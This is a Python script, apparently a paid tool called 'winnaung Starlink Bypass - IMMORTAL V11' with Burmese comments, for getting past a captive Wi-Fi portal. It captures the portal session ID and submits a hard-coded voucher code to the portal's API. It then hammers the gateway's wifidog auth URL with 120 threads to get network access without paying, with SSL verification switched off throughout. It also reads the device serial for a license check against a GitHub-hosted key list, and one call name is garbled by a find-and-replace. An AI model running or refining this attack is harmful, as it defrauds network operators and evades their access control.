    import requests, re, urllib3, time, threading, os, random, hashlib, platform, ssl, json
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime


# --- SSL Error & Winnaung Bypass ---
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

urllib3.disable_winnaung(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
KEY_URL = "https://raw.githubusercontent.com/winnaungmyat3-bit/winnaung/refs/heads/main/key.txt"
LICENSE_FILE = ".aladdin_v11.lic" # ဖုန်းထဲမှာ သိမ်းမယ့် Hidden License File
def get_hwid():
    ID_STORAGE = ".device_id" # ID သိမ်းမည့်ဖိုင်
    
    # ၁။ အရင်က သိမ်းထားတဲ့ ID ရှိမရှိ အရင်စစ်မယ်
    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()

    # ၂။ သိမ်းထားတာ မရှိသေးရင် အသစ်ထုတ်မယ်
    try:
        # Hardware Serial ဖတ်မယ်
        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
        
        if not serial or serial == "unknown" or "012345" in serial:
            serial = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
            
        if not serial:
            import uuid
            serial = str(uuid.getnode())
            
        raw_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
        new_id = f"TRB-{raw_hash}"
    except:
        # ဘာမှဖတ်လို့မရရင်တောင် တစ်ကြိမ်ပဲ Random ထုတ်ပြီး အဲ့ဒါကိုပဲ အသေမှတ်ထားမယ်
        new_id = f"TRB-{hashlib.md5(str(os.getlogin()).encode()).hexdigest()[:10].upper()}"

    # ၃။ ထွက်လာတဲ့ ID ကို ဖုန်းထဲမှာ အသေသိမ်းလိုက်မယ်
    with open(ID_STORAGE, "w") as f:
        f.write(new_id)
        
    return new_id
    
        


def banner():
    os.system('clear')
    print("\033[93m" + " ="*35)
    print("\033[96m" + """
     ██╗    ██╗██╗███╗   ██╗███╗   ██╗ █████╗ ██╗   ██╗███╗   ██╗ ██████╗ 
██║    ██║██║████╗  ██║████╗  ██║██╔══██╗██║   ██║████╗  ██║██╔════╝ 
██║ █╗ ██║██║██╔██╗ ██║██╔██╗ ██║███████║██║   ██║██╔██╗ ██║██║  ███╗
██║███╗██║██║██║╚██╗██║██║╚██╗██║██╔══██║██║   ██║██║╚██╗██║██║   ██║
╚███╔███╔╝██║██║ ╚████║██║ ╚████║██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝  
    """)
    print("\033[95m" + "        ✨ winnaung Starlink Bypass - IMMORTAL V11 ✨")
    print("\033[93m" + " ="*35 + "\033[0m\n")

def save_license(hwid, key, expiry):
    # License ကို ဖုန်းထဲမှာ သိမ်းဆည်းခြင်း
    data = {"id": hwid, "key": key, "expiry": expiry}
    with open(LICENSE_FILE, "w") as f:
        json.dump(data, f)

def load_license():
    # ဖုန်းထဲက License ကို ပြန်ဖတ်ခြင်း
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                return json.load(f)
        except:
            return None
    return None

def check_license():
    hwid = get_hwid()
    banner()
    
    # ၁။ ဖုန်းထဲမှာ သိမ်းထားတဲ့ License ရှိမရှိ အရင်စစ်မယ် (Offline Support)
    local_data = load_license()
    if local_data and local_data.get("id") == hwid:
        expiry_date = datetime.strptime(local_data["expiry"], "%d-%m-%Y")
        if datetime.now() < expiry_date:
            print(f"\033[92m[✓] AUTO-LOGIN SUCCESS! (Offline Mode)\033[0m")
            print(f"\033[94m[*] EXPIRY: {local_data['expiry']}\033[0m")
            time.sleep(1.5)
            return True

    # ၂။ ဖုန်းထဲမှာ မရှိရင် ဒါမှမဟုတ် သက်တမ်းကုန်နေရင် Online ကနေ စစ်မယ်
    print(f"\033[94m[*] YOUR DEVICE ID: {hwid}\033[0m")
    input_key = input("\033[93m[>] ENTER ACCESS KEY: \033[0m").strip()
    
    print("\033[93m[*] Verifying license online...\033[0m")
    try:
        response = requests.get(KEY_URL, timeout=10, verify=False).text
        lines = response.splitlines()
        
        for line in lines:
            if "|" in line:
                parts = line.split("|")
                if len(parts) == 3:
                    db_id, db_key, db_date = parts
                    if db_id.strip() == hwid and db_key.strip() == input_key:
                        expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y")
                        if datetime.now() < expiry_date:
                            # မှန်ကန်ရင် ဖုန်းထဲမှာ သိမ်းလိုက်မယ်
                            save_license(hwid, input_key, db_date.strip())
                            print(f"\033[92m[✓] ACCESS GRANTED! EXPIRY: {db_date}\033[0m")
                            time.sleep(2)
                            return True
                        else:
                            print("\033[91m[!] KEY EXPIRED! PLEASE RENEW.\033[0m")
                            return False
        
        print("\033[91m[!] INVALID KEY OR DEVICE ID NOT REGISTERED.\033[0m")
        return False
    except Exception as e:
        # Internet မရှိလို့ Database ချိတ်မရရင်
        if local_data:
            print("\033[91m[!] Unable to connect, but found expired or invalid local license.\033[0m")
        else:
            print("\033[91m[!] DATABASE ERROR: Please check your internet for first-time login.\033[0m")
        return False

def check_net():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except:
        return False

def high_speed_pulse(link):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"\033[92m[✓] winnaung Bypass | STABLE >>> [{random.randint(40,180)}ms]\033[0m")
            time.sleep(0.01)
        except:
            time.sleep(1)
            break

def start_immortal():
    if not check_license():
        return

    while True:
        session = requests.Session()
        try:
            print("\033[94m[*] winnaung Force Scanning Portal...\033[0m")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            
            p_url = r.url
            r1 = session.get(p_url, verify=False, timeout=5)
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, match.group(1)) if match else p_url
            r2 = session.get(n_url, verify=False, timeout=5)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                print(f"\033[96m[✓] Aladdin SID Captured: {sid[:15]}\033[0m")
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                print("\033[95m[*] ⚡ Launching High-Speed Stable Threads ⚡\033[0m")
                for _ in range(120):
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                
                while True:
                    if not check_net():
                        print("\033[91m[!] Connection Lost! Re-injecting...\033[0m")
                        break
                    time.sleep(5)
            else:
                time.sleep(2)
        except:
            time.sleep(2)

if __name__ == "__main__":
    try:
        start_immortal()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Script Stopped by User.\033[0m")
            
